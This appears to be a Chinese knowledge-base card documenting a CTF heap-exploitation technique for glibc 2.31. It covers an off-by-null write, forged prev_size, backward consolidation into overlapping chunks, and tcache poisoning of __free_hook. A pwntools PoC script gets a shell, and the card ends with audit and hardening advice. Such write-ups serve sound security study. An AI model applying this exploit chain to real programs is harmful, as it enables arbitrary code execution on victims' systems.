---
id: binary-pwn-heap-glibc231-offby-null-no-uaf-overlap-tcache-freehook
title: glibc 2.31 off-by-null 无 UAF：伪造 prev_size 落入 unsorted bin 合并出重叠块，tcache 投毒打 __free_hook
type: scenario
domain: binary
path: binary/pwn/heap
technique: glibc231-offby-null-prev-size-unsorted-merge-overlap-tcache-freehook
aliases:
- glibc 2.31 off by null
- 无 UAF 堆重叠
- prev_size 伪造合并 unsorted
- tcache 投毒 free_hook
- off-by-null 0x100 chunk
tags:
- pwn
- heap
- glibc231
- off-by-null
- unsorted-bin
- chunk-overlap
- tcache
- free-hook
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V654
  verified_at: '2026-11-13T05:40:47+08:00'
  notes: 已对照原文与30图核对：题注2.31/libc-2.31.so、off-by-null(edit_read写size+1、换行改\x00)、无UAF(delete清指针)、size上限0x100、heap leak -0x30a、libc leak -0x1ecc0a、fake chunk(p64(0)+p64(0xf1)+fd=bk=heap+0x9a0即伪造块头自身)、prev_size=0xf0、delete(8)合并、tcache fd投毒free_hook均与exp及截图一致；已将原理中合并对象由'unsorted bin中已释放空闲块'修正为'chunk7用户区伪造块(满足unlink校验)'，并把泄露描述改为'0x10小块切割unsorted后读残留main_arena+96'。未验证点：PoC未本机复跑；glibc版本为题目环境非受影响版本，未设versions；frontmatter无sources/source_url。
---

## 一句话结论

glibc 2.31、无 UAF、申请上限 0x100 的 note 题里，`edit_read` 的行尾处理会多写 1 字节；在 0x100 对齐的 chunk 上这一字节正好是 `\x00`，把下一块 size 从 `0x101` 改成 `0x100`（只清 `PREV_INUSE`、size 仍合法）。在 chunk7 用户区伪造 `size=0xf0`、`fd=bk` 指向伪造块头自身的 fake chunk，把下一块 `prev_size` 指回它后 `free` 下一块，向后合并出覆盖仍被引用 chunk 的大 unsorted 块；再利用重叠写 tcache fd 投毒到 `__free_hook`，写入 `system` 并 free 含 `/bin/sh` 的块拿 shell。

## 原理

- **漏洞形态**：`edit_read(ptr, size)` 的循环写成 `v2 = a2--; if (v2 < 0) break;`，实际最多写 `size+1` 字节；读到换行时把该字节改成 `\x00` 并返回。对 `malloc(0xf8)`（chunk size 0x100，size 字段 `0x101`）而言，多写的 `\x00` 落在下一块 size 的最低字节：`0x101 → 0x100`，`PREV_INUSE` 被清除但 size 仍为合法值。这就是本题要求块大小为 0x100/0x200/0x300 的原因——只有 size 低字节为 `0x01` 时，置零后仍是合法 size。
- **向后合并**：`free(next)` 看到 `PREV_INUSE=0`，读取 `next->prev_size` 并回退该大小做 consolidate backward。把 `prev_size` 伪造成 `0xf0`，回退点落在 chunk7 用户区起始处的伪造块（`prev_size=0, size=0xf1`，`fd=bk=该伪造块头地址`，恰好满足 unlink 的 `FD->bk==P && BK->fd==P` 校验），free 会把 `next` 与该伪造块合并成一个覆盖中间仍被引用 chunk 的大 unsorted 块。
- **为什么无 UAF 也能重叠**：被覆盖的 chunk（如 chunk7）指针仍在 `heap_ptr[]` 中且未释放；合并后从大 unsorted 块重新申请，返回的新 chunk 与 chunk7 的用户区重叠，于是通过 chunk7 的 `edit` 就能改写新 chunk 的 `fd`，把 tcache 链投毒到任意地址。
- **泄露**：先把一个 0x100 块 free 进 unsorted bin，再用 0x10 的小分配切割它，`show` 该小块读残留的 `main_arena+96` 指针得到 libc 基址。
- **收尾**：2.31 没有 safe-linking，tcache fd 是明文；把重叠块的 fd 改成 `__free_hook`，连续两次 `malloc(0xf8)`：第一次拿到普通块写入 `/bin/sh\x00`，第二次返回 `__free_hook` 并写入 `system`，随后 `free` 那个 `/bin/sh` 块即调用 `system("/bin/sh")`。

## 触发条件

- glibc 2.31（有 tcache、无 safe-linking、`__free_hook` 可用）。
- 菜单堆题：add/edit/show/delete 齐全，申请大小上限 0x100，edit 写 `size+1` 字节且换行被替换为 `\x00`。
- 无 UAF（delete 后指针清空），需要靠 off-by-null + 后向合并制造重叠。
- 能控制被溢出块前 8 字节（`prev_size`）与下一块的使用状态。

## 利用步骤

1. **泄堆地址**：申请两个 0xf8 块并 free，重新申请一个 0xf8 块，`show` 读 tcache 的 fd（本例 `heap_base = leak - 0x30a`）。
2. **布置空闲块与 tcache**：继续申请 11 个 0xf8 块，free 7 个填满 tcache，再 free 第 9 个进入 unsorted bin。
3. **泄 libc**：申请 0x10 的小块切割 unsorted，`show` 读 `main_arena+96`（本例偏移 0x1ecc0a）；随后释放小块并申请 0xe0 块调整布局。
4. **伪造 chunk 与 prev_size**：在 chunk7 用户区写入 `p64(0)+p64(0xf1)+p64(heap+0x9a0)+p64(heap+0x9a0)`，补齐到 0xf0 字节后写入下一块的 `prev_size=0xf0`；`edit` 的多写字节把下一块 size 置为 `0x100`。
5. **触发合并**：`delete(8)`，free 按伪造的 `prev_size` 向后合并进 unsorted bin，形成覆盖 chunk7 的大空闲块。
6. **制造重叠并投毒**：重新申请填满 tcache，再申请 0xf8 块与 unsorted 切割块，使 chunk7 与新块重叠；把重叠块的 fd 改为 `__free_hook`。
7. **getshell**：`add(1, 0xf8, '/bin/sh\x00')`、`add(9, 0xf8, p64(system))` 让 `__free_hook` 变成 system，`delete(1)` 触发。

## PoC

```python
# 精简关键步骤（完整脚本见原文）
add(0,0xf8,'aaaa'); add(1,0xf8,'aaaa'); delete(1); delete(0)
add(1,0xf8,''); show(1)
heap_base = u64(p.recv(6).ljust(8,'\x00')) - 0x30a

for i in range(11): add(i,0xf8,'')
for i in range(7):  delete(i)
delete(9)
add(11,0x10,''); show(11)
libc_base = u64(p.recv(6).ljust(8,'\x00')) - 0x1ecc0a
free_hook = libc_base + libc.sym['__free_hook']
system    = libc_base + libc.sym['system']
delete(11); add(12,0xe0,'')

# 伪造 chunk 头 + 下一块 prev_size，edit 的多写 \x00 清 PREV_INUSE
pl  = p64(0) + p64(0xf1) + p64(heap_base+0x9a0) + p64(heap_base+0x9a0)
pl  = pl.ljust(0xf0, '\x00') + p64(0xf0)
edit(7, pl)
delete(8)                      # 向后合并进 unsorted bin

for i in range(7): add(i,0xf8,'')
add(9,0xf8,''); delete(1); delete(9)
edit(7, p64(0) + p64(0x100) + p64(free_hook))   # 重叠后改 fd

add(1,0xf8,'/bin/sh\x00')
add(9,0xf8,p64(system))        # __free_hook = system
delete(1)                      # system("/bin/sh")
```

## 变体与关联

- **块大小变体**：只要下一块 size 低字节为 `0x01`（0x100/0x200/0x300），off-by-null 后 size 仍合法；合并目标 `prev_size` 要按布局精确计算。
- **收尾变体**：有 safe-linking 的 2.32+ 需要先泄露 heap 再编码 fd；无 `__free_hook` 的高版本改走 FSOP/stack ROP。
- 关联卡片：[[binary-pwn-heap-newline-size-diff-0xa-offbyone-prev-inuse-overlap]]（同样是清 PREV_INUSE 后向合并，但由 `size+0xA` 特判触发）、[[binary-pwn-heap-glibc228-offby-null-prev-size-unlink-overlap]]（旧版 unlink 路径）、[[binary-pwn-heap-glibc231-fastbin-stash-tcache-freehook-system]]（同版本 fastbin 倒灌 tcache 打 free_hook）。

## 检测与防御

- **代码审计**：重点看 `read` 循环的边界（`size+1`、`>=`/`>` 混用、先自减后判断），以及换行处理是否写入 `\x00`；输入长度必须按实际可写字节数校验，不能把换行/终止符算作额外空间。
- **编译/运行时加固**：升级到 glibc 2.32+ 启用 safe-linking（tcache fd 加密），2.34+ 移除 `__free_hook` 抬高利用成本；开启 tcache double-free 检查与 `MALLOC_CHECK_`/`glibc.malloc.check` 辅助测试。
- **CTF 之外**：真实程序出现同类单字节溢出时，优先修复长度计算；配合 ASan/Valgrind 在测试阶段发现越界写。
